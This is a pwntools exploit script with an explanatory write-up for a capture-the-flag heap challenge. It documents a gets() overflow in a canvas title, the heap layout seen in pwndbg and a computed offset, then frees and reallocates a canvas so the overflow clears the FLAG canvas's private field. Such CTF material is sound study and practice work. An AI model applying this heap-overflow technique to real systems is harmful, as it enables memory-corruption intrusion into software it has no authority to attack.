from pwn import *

DEBUG = False
REMOTE = 'ctf.segfault.me'
# REMOTE = 'ctf.segfault.me'

if DEBUG:
    P = gdb.debug('./chal')
elif REMOTE:
    P = remote(REMOTE, 3000)
else:
    P = process(['./chal'])

P.recvuntil('> ')

def run(cmd):
    P.sendline(cmd)
    out = P.recvuntil('> ')
    return out


"""
The challenge's heap allocator functions as follows:

Each allocation is prefixed by an `alloc_t` struct which is 32 bytes long.
Allocations are linear and the allocator will re-use the first free allocation that
is large enough for new allocations.

VULNERABILITY:

When creating a new canvas, there is a buffer overflow in the title.

    ascii.c:53
        c->title = HeapAlloc(g_heap, 16);

    [...]

    ascii.c:174
        printf("Title?> ");
        gets(c->title);
IDEAS:

1. If we can have a title allocation that comes before the FLAG allocation, we
   can overflow the title into the `canvas_t` that contains the FLAG and set
   `canvas->private` to 0. Then we can print the FLAG.

2. If we can overflow into another `canvas`, we can overwrite its `canvas->data`
   to point to the FLAG.


NOTES:

Be careful about overwriting the canvas->next pointer, as it can result in crashes
when traversing the canvas list :)


EXPLOIT:

First, notice that the binary is fully position independent and has ASLR enabled,
so we cannot hardcode any addreses.

Thankfully, the heap is very predictable, so minimal grooming is required.
Let's launch it in the debugger and identify the heap layout.

Set a breakpoint in `show` and type `show 3` which will break when attempting to display
the FLAG canvas. Step to line 138 using `n`.

Now, dump the canvas bytes:

    pwndbg> hexdump ((uint8_t*)c)
    +0000 0x7ffff75e3955  95 39 5e f7  ff 7f 00 00  25 00 01 00  01 00 03 00  │.9^.│....│%...│....│
    +0010 0x7ffff75e3965  c5 39 5e f7  ff 7f 00 00  0b 33 5e f7  ff 7f 00 00  │.9^.│....│.3^.│....│
    +0020 0x7ffff75e3975  40 95 75 55  55 55 00 00  10 00 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0030 0x7ffff75e3985  00 00 00 00  00 00 00 00  a5 39 5e f7  ff 7f 00 00  │....│....│.9^.│....│

And recall the structure of a canvas:

    typedef struct canvas_
    {
        char *title;             //  8B
        uint16_t width, height;  //  4B
        uint16_t private;        //  2B (canvas_t + 12)
        uint16_t id;             //  2B
        char *data;              //  8B
        struct canvas_ *next;    //  8B
    } canvas_t;                  // 32B (0x20)

Also recall that right before the canvas, we should see an `alloc_t` header which looks like:

    typedef struct alloc_
    {
        chunk_t *chunk;      //  8B
        size_t size;         //  8B
        uint8_t free;        //  8B (Not packed; Padding!)
        struct alloc_ *next; //  8B
    } alloc_t;               // 32B (0x20)

So let's see what we have.

    pwndbg> hexdump ((uint8_t*)c-0x20)
    +0000 0x7ffff75e3935  40 95 75 55  55 55 00 00  20 00 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0010 0x7ffff75e3945  00 00 00 00  00 00 00 00  75 39 5e f7  ff 7f 00 00  │....│....│u9^.│....│
    +0020 0x7ffff75e3955  95 39 5e f7  ff 7f 00 00  25 00 01 00  01 00 03 00  │.9^.│....│%...│....│
    +0030 0x7ffff75e3965  c5 39 5e f7  ff 7f 00 00  0b 33 5e f7  ff 7f 00 00  │.9^.│....│.3^.│....│

    pwndbg> dq ((uint8_t*)c-0x20) 4
    00007ffff75e3935     0000555555759540 0000000000000020
    00007ffff75e3945     0000000000000000 00007ffff75e3975

> Notice that we cast the `canvas_t*` as a `uint8_t*` to otherwise pointer additions will work in
> multiple of `sizeof(canvas_t)`. This is a very common mistake.

This looks like a valid `alloc_t` structure. the size member matches `sizeof(canvas_t)` so this looks good.

Now let's find the allocation that comes right before. Because we understand the heap allocator, it's easy
to figure out that this is the allocation for canvas id 2, as all allocations are linear.

More specifically, the heap looks like this:

            +---------+-------------+---------+-----------+---------+----------+
    Canvas 1| alloc_t | canvas_t c1 | alloc_t | c1->title | alloc_t | c1->data |
            +---------+-------------+---------+-----------+---------+----------+
    Canvas 2| alloc_t | canvas_t c2 | alloc_t | c2->title | alloc_t | c2->data |
            +---------+-------------+---------+-----------+---------+----------+
    Canvas 3| alloc_t | canvas_t c3 | alloc_t | c3->title | alloc_t | c3->data |
            +---------+-------------+---------+-----------+---------+----------+

So if we can replace, say, canvas c2 and overflow its title into the `c3` struct, we should
be able to set its `private` field to `0`.

This is well and good, but there are two requirements that must be satisfied:
    - Have control of `c2`.
    - Knowing the distance between `c2->title` and `c3->private`

The first can be done by abusing the allocator: If we free `c2` and allocate a new canvas,
the allocator will re-use the space that `c2` freed-up. This lets us overflow the title.

> Note: The size of the data buffer doesn't matter, since the `canvas->title` member comes
> before `canvas->data`.

Let's find `c2->title` by performing a few hexdumps while moving backward.

    pwndbg> hexdump ((uint8_t*)c-0x100)
    +0000 0x7ffff75e3855  20 20 20 20  7c 20 20 2f  4a 20 20 7c  20 20 20 20  │....│|../│J..|│....│
    +0010 0x7ffff75e3865  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│
    +0020 0x7ffff75e3875  20 20 20 20  20 20 20 20  20 7c 20 4a  20 20 20 20  │....│....│.|.J│....│
    +0030 0x7ffff75e3885  20 60 2e 20  20 7c 20 20  20 20 20 20  20 20 20 20  │.`..│.|..│....│....│
    ...

    pwndbg> hexdump ((uint8_t*)c-0x600)
    +0000 0x7ffff75e3355  6f 6f 73 65  00 00 40 95  75 55 55 55  00 00 ba 05  │oose│..@.│uUUU│....│
    +0010 0x7ffff75e3365  00 00 00 00  00 00 00 00  00 00 00 00  00 00 35 39  │....│....│....│..59│
    +0020 0x7ffff75e3375  5e f7 ff 7f  00 00 20 20  20 20 20 20  20 20 20 20  │^...│....│....│....│
    +0030 0x7ffff75e3385  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│

    ...

    pwndbg> hexdump ((uint8_t*)c-0x60a)
    +0000 0x7ffff75e334b  43 61 6e 61  64 69 61 6e  20 4d 6f 6f  73 65 00 00  │Cana│dian│.Moo│se..│
    +0010 0x7ffff75e335b  40 95 75 55  55 55 00 00  ba 05 00 00  00 00 00 00  │@.uU│UU..│....│....│
    +0020 0x7ffff75e336b  00 00 00 00  00 00 00 00  35 39 5e f7  ff 7f 00 00  │....│....│59^.│....│
    +0030 0x7ffff75e337b  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │....│....│....│....│

In this case, the address is `0x7ffff75e334b`.

Looking back on c3->private, the address is `c3 + 12B` which is `0x7ffff75e3955 + 12 == 0x7ffff75e3961`,
meaning that the distance is: `0x7ffff75e3961 - 0x7ffff75e334b = 1558`

We know that gets adds a terminating \0, so that should be enough to clear the private byte.

"""

SIZE = 1558
run('del 2')
run('new')
run('10')
run('10')
run('A' * SIZE)
P.sendline('show 3')

success(P.recvuntil(b'\0')[:-1].decode())
print()
P.close()

# run('exit')
